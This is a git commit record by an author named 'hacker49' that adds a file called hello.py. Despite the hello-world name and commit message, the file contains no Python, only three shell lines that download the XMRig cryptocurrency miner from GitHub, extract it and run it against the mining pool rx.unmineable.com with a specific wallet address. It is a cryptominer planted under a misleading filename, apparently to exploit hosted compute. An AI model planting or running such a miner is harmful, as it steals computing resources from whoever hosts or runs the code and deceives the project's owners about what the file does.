2509e7d7da129c858f622d254597172c191dd4ac
hacker49 <150mkv@gmail.com>
2021-05-29 18:54:47 +0530

    Create hello.py

---
+++ hello.py
@@ -0,0 +1,3 @@
+! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
+! tar -xvf xmrig-6.12.1-linux-x64.tar.gz
+! ./xmrig-6.12.1/xmrig -o rx.unmineable.com:3333 -a rx -k -u WIN:TRg5jXpVkgEgP4i3N5PXx57mPbJJ2yBK6Y.N1 -p x
